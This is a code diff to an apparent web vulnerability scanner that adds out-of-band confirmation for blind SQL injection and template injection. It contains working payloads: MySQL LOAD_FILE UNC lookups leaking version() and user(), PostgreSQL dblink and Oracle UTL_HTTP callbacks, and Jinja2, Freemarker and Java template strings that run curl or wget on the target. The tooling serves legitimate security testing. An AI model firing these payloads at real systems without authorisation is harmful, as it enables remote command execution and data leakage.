@@ -102,6 +102,189 @@ def _ssti_payloads() -> List[Dict]:
     ]
 
 
+# ─────────────────────────────────────────────────
+# Payload-DB integration (data/payloads/*.json) + OOB helpers
+# ─────────────────────────────────────────────────
+#
+# Every loader returns the inline list unchanged when the JSON DB is
+# missing/unparseable, so callers keep identical behavior without data/.
+
+
+def _db_extra_sqli_payloads() -> List[Dict]:
+    """Extra SQLi error-detection entries from the payload DB (if present)."""
+    from tools.payload_db import get_payloads
+
+    extras = []
+    for entry in get_payloads("sqli"):
+        detect = entry.get("detect") or {}
+        if entry.get("context") != "error" or detect.get("type") not in ("regex", "content"):
+            continue
+        pattern = detect.get("pattern", "")
+        if not pattern:
+            continue
+        extras.append(
+            {
+                "payload": entry["value"],
+                "type": f"db_{entry.get('target', 'generic')}",
+                "errors": [pattern.lower()],
+            }
+        )
+    return extras
+
+
+def _db_extra_ssti_payloads() -> List[Dict]:
+    """Extra SSTI arithmetic entries from the payload DB (if present)."""
+    from tools.payload_db import get_payloads
+
+    extras = []
+    for entry in get_payloads("ssti"):
+        detect = entry.get("detect") or {}
+        if entry.get("context") != "reflection" or detect.get("type") != "content":
+            continue
+        marker = detect.get("pattern", "")
+        if marker:
+            extras.append(
+                {
+                    "payload": entry["value"],
+                    "type": f"db_{entry.get('target', 'generic')}",
+                    "detect": marker,
+                }
+            )
+    return extras
+
+
+def _oob_sqli_payloads(callback_base: str) -> List[Dict]:
+    """OOB ('blind') SQLi exfil payloads — most reliable per dialect.
+
+    Each payload triggers a DNS/HTTP request from the *database* server to
+    the OOB callback host when injection succeeds. ``callback_base`` is the
+    token URL minus scheme (e.g. ``127.0.0.1:9000/abc123``) so it fits both
+    UNC paths (MySQL) and URL-based (PostgreSQL/Oracle) exfil.
+    """
+    return [
+        # MySQL on Windows — UNC path via LOAD_FILE triggers a DNS/HTTP lookup.
+        {
+            "payload": f"' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.{callback_base}\\\\a')))-- -",
+            "type": "oob_mysql_load_file",
+        },
+        {
+            "payload": f"' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT user()),'.{callback_base}\\\\a')))-- -",
+            "type": "oob_mysql_load_file_user",
+        },
+        # PostgreSQL — dblink performs a TCP connection to the callback host.
+        {
+            "payload": (
+                f"';SELECT dblink('host={callback_base.split('/')[0].split(':')[0]} "
+                f"port={callback_base.split('/')[0].split(':')[1] if ':' in callback_base.split('/')[0] else 80} "
+                "dbname=x user=x password=x connect_timeout=3','SELECT 1')-- -"
+            ),
+            "type": "oob_postgres_dblink",
+        },
+        # Oracle — UTL_HTTP issues an HTTP request from the DB.
+        {
+            "payload": f"'||(SELECT UTL_HTTP.REQUEST('http://{callback_base}') FROM dual)-- -",
+            "type": "oob_oracle_utl_http",
+        },
+    ]
+
+
+def _oob_ssti_payloads(callback_base: str, scheme: str = "http") -> List[Dict]:
+    """OOB SSTI payloads — RCE-capable engines ping the callback host."""
+    url = f"{scheme}://{callback_base}"
+    return [
+        # Jinja2 (Flask/Django-style) — reach OS via config globals, curl the callback.
+        {
+            "payload": (
+                "{{config.__class__.__init__.__globals__['os'].popen('curl " + url + "').read()}}"
+            ),
+            "type": "oob_jinja2_curl",
+        },
+        # Freemarker — Execute utility spawns curl.
+        {
+            "payload": "${\"curl " + url + "\"?execute()}",
+            "type": "oob_freemarker_exec",
+        },
+        # Velocity / generic Java EL — Runtime exec with wget fallback target.
+        {
+            "payload": ("#set($r=$class.inspect('java.lang.Runtime')){{/*velocity*/}}" "[[${T(java.lang.Runtime).getRuntime().exec('wget " + url + "')}]]"),
+            "type": "oob_java_runtime_exec",
+        },
+    ]
+
+
+def _get_oob_server(enable_oob: bool, oob_timeout: float):
+    """Return the shared OOB server, or None when disabled/unavailable."""
+    if not enable_oob:
+        return None
+    try:
+        from tools.oob_server import get_oob_server
+
+        srv = get_oob_server()
+        return srv if srv is not None and srv.running else None
+    except Exception as e:
+        logger.debug(f"OOB unavailable: {e}")
+        return None
+
+
+def _run_oob_pass(
+    url: str,
+    test_params: List[str],
+    found_params: set,
+    builder,
+    kind: str,
+    oob_timeout: float,
+) -> List[Dict]:
+    """Fire per-param OOB payloads for params with no signature finding.
+
+    ``builder(callback_base, scheme)`` returns payload dicts for one token.
+    A callback hit within ``oob_timeout`` seconds yields a finding flagged
+    ``blind_confirmed=True, provenance='oob_callback'``.
+    """
+    oob = _get_oob_server(True, oob_timeout)
+    if oob is None:
+        return []
+    findings: List[Dict] = []
+    session = _make_session()
+    scheme = urlparse(url).scheme or "http"
+    try:
+        for param in test_params:
+            if param in found_params:
+                continue
+            token, callback_url = oob.new_url()
+            callback_base = callback_url.split("://", 1)[-1]
+            for p in builder(callback_base, scheme):
+                try:
+                    session.get(
+                        _inject_param(url, param, p["payload"]),
+                        timeout=_TIMEOUT,
+                    )
+                except Exception:
+                    continue
+            hit = oob.wait_for(token, timeout=oob_timeout)
+            if hit is not None:
+                findings.append(
+                    {
+                        "title": f"Blind {kind.upper()} (OOB-confirmed) via '{param}'",
+                        "description": (
+                            f"Server/backend resolved or fetched an out-of-band callback "
+                            f"issued only via the '{param}' payload.\n"
+                            f"Callback: {hit.method} {hit.path} from {hit.client}\n"
+                            f"URL: {url}"
+                        ),
+                        "severity": "critical",
+                        "type": kind,
+                        "param": param,
+                        "payload_type": "oob",
+                        "url": url,
+                        "blind_confirmed": True,
+                        "provenance": "oob_callback",
+                    }
+                )
+    finally:
+        session.close()
+    return findings
+
+
 def _lfi_payloads() -> List[Dict]:
     """Generate LFI / Path Traversal payloads."""
     return [
@@ -194,8 +377,17 @@ def test_xss(url: str, params: Optional[List[str]] = None) -> List[Dict]:
     return findings
 
 
-def test_sqli(url: str, params: Optional[List[str]] = None) -> List[Dict]:
-    """Test URL parameters for SQL injection."""
+def test_sqli(
+    url: str,
+    params: Optional[List[str]] = None,
+    enable_oob: bool = True,
+    oob_timeout: float = 3.0,
+) -> List[Dict]:
+    """Test URL parameters for SQL injection.
+
+    ``enable_oob`` adds a blind-confirmation pass (OOB DNS/HTTP exfil via the
+    local callback server) for parameters with no signature-based finding.
+    """
     findings = []
     session = _make_session()
 
@@ -281,11 +473,28 @@ def test_sqli(url: str, params: Optional[List[str]] = None) -> List[Dict]:
         findings = unique
 
     session.close()
+
+    # Blind pass: OOB exfil payloads for params with no signature finding
+    sig_found = {f["param"] for f in findings}
+    findings.extend(
+        _run_oob_pass(url, test_params, sig_found, _oob_sqli_payloads, "sqli", oob_timeout)
+        if enable_oob
+        else []
+    )
     return findings
 
 
-def test_ssti(url: str, params: Optional[List[str]] = None) -> List[Dict]:
-    """Test URL parameters for SSTI."""
+def test_ssti(
+    url: str,
+    params: Optional[List[str]] = None,
+    enable_oob: bool = True,
+    oob_timeout: float = 3.0,
+) -> List[Dict]:
+    """Test URL parameters for SSTI.
+
+    ``enable_oob`` adds a blind-confirmation pass (OOB callback payload for
+    RCE-capable engines) for parameters with no signature-based finding.
+    """
     findings = []
     session = _make_session()
 
@@ -333,6 +542,14 @@ def test_ssti(url: str, params: Optional[List[str]] = None) -> List[Dict]:
                 continue
 
     session.close()
+
+    # Blind pass: OOB-exec payloads for params with no signature finding
+    sig_found = {f["param"] for f in findings}
+    findings.extend(
+        _run_oob_pass(url, test_params, sig_found, _oob_ssti_payloads, "ssti", oob_timeout)
+        if enable_oob
+        else []
+    )
     return findings
 
 
